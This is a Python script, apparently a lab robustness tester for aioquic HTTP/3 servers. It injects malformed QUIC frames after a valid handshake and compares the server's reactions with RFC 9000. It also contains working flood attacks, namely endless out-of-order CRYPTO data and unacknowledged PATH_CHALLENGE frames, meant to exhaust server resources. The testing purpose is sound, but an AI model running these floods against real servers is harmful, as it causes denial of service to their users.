#!/usr/bin/env python3
"""M6: robustness tests against an aioquic server (local lab only).

The attacker is an ordinary client: it completes a valid handshake with aioquic and
then puts arbitrary frames into its 1-RTT packets (written straight into aioquic's
packet builder, with no checks), like MerCuriuzz's attacker.

  m6_attack.py ADDR case NAME          one malformed/misplaced frame, report the server's reaction
  m6_attack.py ADDR flood crypto  SECS out-of-order CRYPTO data that never becomes contiguous
  m6_attack.py ADDR flood pathchallenge SECS
                                       PATH_CHALLENGE frames, and the attacker never ACKs
  m6_attack.py ADDR probe              legitimate HTTP/3 GET, prints ok/fail and the time
"""
import argparse, asyncio, os, ssl, sys, time

from aioquic.asyncio import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.buffer import Buffer, encode_uint_var
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import DataReceived, HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnection
from aioquic.quic.events import ConnectionTerminated, PingAcknowledged
from aioquic.quic.packet_builder import QuicPacketBuilderStop

V = encode_uint_var
PORT = int(os.environ.get("M6_PORT", "443"))   # 443 in the lab; another port for local debugging

# ---- injection into aioquic's packet writer --------------------------------------------
_orig_limits = QuicConnection._write_connection_limits
_orig_ack = QuicConnection._write_ack_frame


def _limits_and_inject(self, builder, space):
    """Called for every 1-RTT packet: write the pending raw frames that fit."""
    _orig_limits(self, builder, space)
    q = getattr(self, "inject", None)
    while q:
        ftype, body = q[0]
        buf = builder.start_frame(ftype, capacity=len(body) + 8)   # may raise Stop: next packet
        buf.push_bytes(body)
        q.popleft()
        self.injected = getattr(self, "injected", 0) + 1


def _maybe_no_ack(self, builder, space, now):
    if getattr(self, "no_ack", False):
        space.ack_at = None          # never acknowledge the server's packets
        return
    _orig_ack(self, builder, space, now)


def _ignore_path_response(self, context, frame_type, buf):
    # the PATH_CHALLENGEs were injected behind aioquic's back, so it would treat the
    # server's PATH_RESPONSEs as unsolicited and close the connection itself
    buf.pull_bytes(8)


QuicConnection._write_connection_limits = _limits_and_inject
QuicConnection._write_ack_frame = _maybe_no_ack
QuicConnection._handle_path_response_frame = _ignore_path_response

# ---- malformed / misplaced frames: (frame type, body, what RFC 9000 expects) -----------
SID_CLIENT_BIDI = 0
CASES = {
    # frame type that does not exist
    "unknown-frame":      (0x40, b"", "FRAME_ENCODING_ERROR (0x7)"),
    # frames only a server may send
    "handshake-done":     (0x1E, b"", "PROTOCOL_VIOLATION (0xa)"),
    "new-token":          (0x07, V(4) + b"abcd", "PROTOCOL_VIOLATION (0xa)"),
    # STREAM on a server-initiated unidirectional stream (3): the client cannot send there
    "stream-recv-only":   (0x0A, V(3) + V(4) + b"data", "STREAM_STATE_ERROR (0x5)"),
    # STOP_SENDING on a server-initiated bidirectional stream that was never opened (1)
    "stop-unopened":      (0x05, V(1) + V(0), "STREAM_STATE_ERROR (0x5)"),
    # ACK of a packet number the server never sent
    "ack-unsent":         (0x02, V(1_000_000) + V(0) + V(0) + V(0), "PROTOCOL_VIOLATION (0xa)"),
    # STREAM frame that says 1000 bytes but carries 4 (truncated)
    "stream-truncated":   (0x0E, V(SID_CLIENT_BIDI) + V(0) + V(1000) + b"data", "FRAME_ENCODING_ERROR (0x7)"),
    # offset + length beyond 2^62-1
    "stream-offset-max":  (0x0E, V(SID_CLIENT_BIDI) + V(2**62 - 2) + V(4) + b"data", "FRAME_ENCODING_ERROR (0x7)"),
    # MAX_STREAMS above 2^60
    "max-streams-huge":   (0x12, V(2**60 + 1), "FRAME_ENCODING_ERROR (0x7)"),
    # NEW_CONNECTION_ID with retire_prior_to > sequence number
    "ncid-retire-gt-seq": (0x18, V(5) + V(9) + bytes([8]) + os.urandom(8) + os.urandom(16), "FRAME_ENCODING_ERROR (0x7)"),
    # RETIRE_CONNECTION_ID for a sequence number the server never issued
    "retire-unissued":    (0x19, V(1000), "PROTOCOL_VIOLATION (0xa)"),
    # PATH_RESPONSE that answers no challenge (RFC: MAY be a PROTOCOL_VIOLATION)
    "path-response-bogus":(0x1B, os.urandom(8), "ignore or PROTOCOL_VIOLATION (0xa)"),
}


class Attacker(QuicConnectionProtocol):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        from collections import deque
        self._quic.inject = deque()
        self.closed = asyncio.get_event_loop().create_future()
        self.pong = asyncio.Event()

    def quic_event_received(self, event):
        if isinstance(event, ConnectionTerminated) and not self.closed.done():
            self.closed.set_result(event)
        elif isinstance(event, PingAcknowledged):
            self.pong.set()


class Probe(QuicConnectionProtocol):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self.h3 = H3Connection(self._quic)
        self.done = asyncio.get_event_loop().create_future()
        self.status = None

    def quic_event_received(self, event):
        for e in self.h3.handle_event(event):
            if isinstance(e, HeadersReceived):
                self.status = dict(e.headers).get(b":status", b"?").decode()
            if getattr(e, "stream_ended", False) and not self.done.done():
                self.done.set_result(True)


def config():
    c = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN, server_name="server.lab",
                          cafile="/certs/ca.crt", idle_timeout=30)
    if os.environ.get("SSLKEYLOGFILE"):
        c.secrets_log_file = open(os.environ["SSLKEYLOGFILE"], "a")
    return c


def describe(ev):
    return f"CONNECTION_CLOSE code=0x{ev.error_code:x} frame_type={ev.frame_type} reason={ev.reason_phrase!r}"


async def run_case(addr, name):
    ftype, body, expected = CASES[name]
    async with connect(addr, PORT, configuration=config(), create_protocol=Attacker) as c:
        c._quic.inject.append((ftype, body))
        c.transmit()
        try:
            ev = await asyncio.wait_for(asyncio.shield(c.closed), 2)
            got = describe(ev)
        except asyncio.TimeoutError:
            # still open? ask with a PING
            c._quic.send_ping(1); c.transmit()
            try:
                await asyncio.wait_for(c.pong.wait(), 2)
                got = "no close, connection still answers (frame ignored)"
            except asyncio.TimeoutError:
                got = "no answer at all"
    print(f"case={name} expected={expected} | got: {got}")


async def run_flood(addr, kind, secs):
    sent_frames = 0
    async with connect(addr, PORT, configuration=config(), create_protocol=Attacker) as c:
        q = c._quic
        if kind == "pathchallenge":
            q.no_ack = True
        t0 = time.monotonic(); off = 1; last = t0
        while time.monotonic() - t0 < secs and not c.closed.done():
            while len(q.inject) < 2000:
                if kind == "crypto":
                    # 1000-byte chunks after a 1-byte gap at offset 0: never delivered to TLS
                    q.inject.append((0x06, V(off) + V(1000) + os.urandom(1000)))
                    off += 1000
                else:
                    q.inject.append((0x1A, os.urandom(8)))
            c.transmit()
            await asyncio.sleep(0)          # let the event loop read the server's packets
            if time.monotonic() - last >= 5:
                last = time.monotonic()
                print(f"  t={last - t0:5.1f}s injected={getattr(q, 'injected', 0)}"
                      + (f" crypto_offset={off/1e6:.1f}MB" if kind == "crypto" else ""), flush=True)
        el = time.monotonic() - t0
        got = describe(c.closed.result()) if c.closed.done() else "connection still open"
        print(f"flood={kind} secs={el:.1f} injected={getattr(q, 'injected', 0)} | end: {got}")


async def run_probe(addr):
    t0 = time.monotonic()
    try:
        async with connect(addr, PORT, configuration=config(), create_protocol=Probe) as c:
            sid = c._quic.get_next_available_stream_id()
            c.h3.send_headers(sid, [(b":method", b"GET"), (b":scheme", b"https"),
                                    (b":authority", b"server.lab"), (b":path", b"/")], end_stream=True)
            c.transmit()
            await asyncio.wait_for(c.done, 3)
            print(f"probe ok status={c.status} t={time.monotonic() - t0:.3f}s")
    except Exception as e:
        print(f"probe FAIL {type(e).__name__} t={time.monotonic() - t0:.3f}s")


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("addr"); p.add_argument("mode", choices=["case", "flood", "probe"])
    p.add_argument("arg", nargs="?"); p.add_argument("secs", nargs="?", type=float, default=60)
    a = p.parse_args()
    if a.mode == "case":
        names = list(CASES) if a.arg == "all" else [a.arg]
        for n in names:
            try:
                asyncio.run(asyncio.wait_for(run_case(a.addr, n), 10))
            except Exception as e:
                print(f"case={n} | attacker error: {type(e).__name__} {e}")
    elif a.mode == "flood":
        asyncio.run(run_flood(a.addr, a.arg, a.secs))
    else:
        asyncio.run(asyncio.wait_for(run_probe(a.addr), 5))
